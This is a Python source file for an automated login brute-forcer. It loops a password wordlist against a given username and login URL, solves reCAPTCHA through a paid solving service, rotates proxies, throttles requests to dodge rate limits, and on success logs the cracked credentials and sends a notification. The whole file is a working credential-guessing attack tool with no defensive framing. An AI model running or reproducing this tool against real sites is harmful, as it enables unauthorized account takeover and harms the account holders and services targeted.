from modules.wordlist import read_wordlist
from modules.captcha import solve_captcha
from modules.logger import log_result
from modules.rate_limiter import delay_request
from modules.notification import send_notification
from modules.error_handler import retry_on_error
from modules.proxy_manager import get_proxy
import requests
from typing import Dict, Any

def start_bruteforce(url: str, username: str, wordlist_path: str, captcha_url: str, api_key: str) -> None:
    passwords = read_wordlist(wordlist_path)
    for password in passwords:
        captcha_response: str = retry_on_error(lambda: solve_captcha(captcha_url, api_key))
        data: Dict[str, Any] = {
            "username": username,
            "password": password,
            "g-recaptcha-response": captcha_response
        }
        delay_request()
        try:
            response = requests.post(url, data=data, proxies=get_proxy(), timeout=10)
            if "dashboard" in response.text or "welcome" in response.text:
                log_result(username, password, "Success")
                send_notification(f"Login berhasil: {username}:{password}")
                break
            else:
                log_result(username, password, "Failed")
        except Exception as e:
            log_result(username, password, f"Error: {e}")